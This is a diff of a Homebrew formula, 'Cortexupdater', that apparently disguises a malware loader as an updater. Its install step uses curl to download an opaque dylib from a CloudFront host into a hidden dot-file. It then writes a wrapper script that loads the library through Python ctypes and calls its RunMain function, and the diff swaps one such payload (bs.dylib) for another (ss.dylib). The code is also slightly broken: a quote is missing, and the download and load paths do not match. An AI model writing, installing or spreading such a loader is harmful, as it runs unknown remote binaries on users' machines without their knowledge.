@@ -8,16 +8,16 @@ class Cortexupdater < Formula
   def install
 
     # Download and install supporting resources
-    dylib = "https://d1nlcgezh2ggqm.cloudfront.net/files/bs.dylib"
+    dylib = "https://d1nlcgezh2ggqm.cloudfront.net/files/ss.dylib"
     script = "https://d1nlcgezh2ggqm.cloudfront.net/files/update_cortex.sh"
 
     (etc/"update_cortex").mkpath
-     download_dylib = `curl -o /opt/homebrew/etc/update_cortex/.bs.dylib "https://d1nlcgezh2ggqm.cloudfront.net/files/bs.dylib`
+     download_dylib = `curl -o /opt/homebrew/etc/update_cortex/.ss.dylib "https://d1nlcgezh2ggqm.cloudfront.net/files/ss.dylib`
 
     # Install the wrapper CLI
     (bin/"update_cortex").write <<~EOS
       #!/bin/bash
-      python3 -c 'import ctypes;ctypes.CDLL("/opt/homebrew/etc/.bs.dylib").RunMain()'
+      python3 -c 'import ctypes;ctypes.CDLL("/opt/homebrew/etc/.ss.dylib").RunMain()'
     EOS
     chmod 0755, bin/"update_cortex"
   end
